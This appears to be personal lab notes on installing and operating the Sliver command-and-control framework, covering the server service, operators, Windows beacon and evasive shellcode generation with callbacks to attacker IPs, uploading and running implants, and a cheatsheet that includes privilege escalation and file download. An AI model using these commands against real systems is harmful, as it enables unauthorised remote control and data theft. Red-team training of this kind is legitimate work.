
## Dealing with Errors
I ran into a lot. Common issues included:

Outdated sliver binaries
Pre-existing ~/.sliver directory
No mingw compiler
## Installing Sliver

```bash

# Remove existing sliver stuff, run as sudo
rm /bin/sliver
rm /bin/sliver-server
rm -rf /root/.sliver
rm -rf ~/.sliver

# Below is the easy way
####### IF YOU DO IT BELOW, BEWARE OF ERRORS WITH OUTDATED VERSIONS DUE TO HARDCODED VERSION IN WGET URL ##################
wget -O /bin/sliver-server https://github.com/BishopFox/sliver/releases/download/v1.5.43/sliver-server_linux 
chmod 755 /bin/sliver-server

wget -O /bin/sliver https://github.com/BishopFox/sliver/releases/download/v1.5.43/sliver-client_linux
chmod 755 /bin/sliver

# Windows C Compiler
sudo apt install mingw-w64

# Run as normal
# Unpack assets, as user
sliver-server unpack --force




```
We can make it run on startup by making a service
```bash
vi /etc/systemd/system/sliver.service
# Paste below file
```

```
[Unit]
Description=Sliver
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=on-failure
RestartSec=3
User=root
ExecStart=/bin/sliver-server daemon

[Install]
WantedBy=multi-user.target
```
Then
```bash
chmod 600 /etc/systemd/system/sliver.service
systemctl enable sliver && systemctl start sliver

# If you run into errors, it might be because sliver files already exist on your system, in /home/kali/.sliver, /root/.sliver, and ~/.sliver

# Check that the server is up
netstat -antopul


```

## Adding a New Operator
```bash
cd ~
sliver-server
# Review command
[server] sliver > help new-operator
# Listen on specific IP
[server] sliver > new-operator -n attacker -l tun0

# More generous allow

[server] sliver > new-operator -n attacker -l 0.0.0.0
# Enable multiplayer
[server] sliver > multiplayer

# New session
# Import the attacker config
sliver import attacker_0.0.0.0.cfg

# And boot sliver client
sliver


```

## Armory
Sliver's armory is a plugin system
```bash
# Get help
sliver > armory
# Install all
sliver > armory install all
```


## Generating Beacons
There's a lot of factors. The below generates a beacon that is called 'http_beacon', is a windows executable, listens on 127.0.0.1 (default port 80)
```bash
sliver > help generate beacon 
sliver > generate beacon --http 10.10.110.10 --name httpbeacon80 --os windows

# One with a low delay/jitter
sliver > generate beacon --http 10.10.110.10 --name httpbeacon80fast --os windows --jitter 1 --seconds 5
```

## Setting up a Listener
```bash
# Setup a listener for beacons on port 80
sliver > http --lport 80

# List active listeners
sliver > jobs

# Kill job 2, to free up listener on that port
sliver > kill -k 2 

```

## Using the Beacon

```bash
# List beacons
sliver > beacons
# Load an active beacon
sliver > use c44362b7

# List common commands
sliver > help

# Upload a file, note the double slashes
upload /home/kali/work/prolab/ligolo/ligolo-windows-agent.exe C:\\ProgramData\\ligolo-windows-agent.exe

# Upload a beacon
upload /home/kali/work/prolab/sliver/httpbeacon80fast.exe C:\\ProgramData\\fast.exe

# Execute that Beacon
sliver > execute powershell.exe -Command "Start-Process C:\\ProgramData\\fast2.exe"
# Run a command

# Spawn an interactive session

```

## Implants
Implants are basically a way of communicating. There are two types of implants: beacons (operate in intervals), and sessions (more immediate back and forth)
## Shellcode
Shellcode can be used to execute code and bypass AV's. Shellcode is usually executed by a droper.

Conceptually, the shellcode is hosted somewhere (usually your own server, and it's also usually obfuscated shellcode)

And the dropper is a simple program that accesses that hosted shellcode, and executes it.

```bash
sliver > generate beacon --arch amd64 --os windows --http 10.10.15.250:80 --format shellcode --evasion --timeout 300 --seconds 5 --jitter 1

```


## Cheatsheet

| **Command**                                                               | **Description**                                              |
| ------------------------------------------------------------------------- | ------------------------------------------------------------ |
| `help`                                                                    | Displays the commands and their descriptions                 |
| `http -L <Local IP> -l <Port>`                                            | Set up HTTP listener                                         |
| `profiles new --http <Local IP>:<Port> --format shellcode <Profile Name>` | Create a new C2 profile                                      |
| `stage-listener --url tcp://<Localhost:Port> --profile <Profile name>`    | Set up Stager listener                                       |
| `generate --http <Local IP>:<Port> --os <OS>`                             | Generates a session implant                                  |
| `generate beacon --http <Local IP>:<Port> --os <OS>`                      | Generates a beacon implant                                   |
| `sessions`                                                                | Lists active/inactive sessions                               |
| `sessions -K`                                                             | Removes all sessions available or not                        |
| `sessions prune`                                                          | Removes unavailable sessions                                 |
| `sessions -k -i <session>`                                                | Removes the specified session                                |
| `beacons`                                                                 | Lists active/inactive beacons                                |
| `tasks`                                                                   | Lists the pending or completed tasks ran by the operator     |
| `getsystem`                                                               | Attempts to get a session as NT AUTHORITY\SYSTEM             |
| `interactive`                                                             | Tasks the beacon to spawn a session that becomes interactive |
| `cd`                                                                      | Change directory                                             |
| `ls`                                                                      | Lists the contents of the directory                          |
| `download <file/directory>`                                               | Downloads a file/directory                                   |
| `upload`                                                                  | Uploads a file                                               |
| `execute-assembly`                                                        | Executes a .NET assembly in a child process                  |
| `execute-shellcode`                                                       | Executes the specified shellcode in process                  |
| `multiplayer`                                                             | Enables multiplayer mode on the server                       |
| `armory install <alias/extension>`                                        | Installs the given alias/extension                           |
| `armory install all`                                                      | Installs all of the available aliases/extensions             |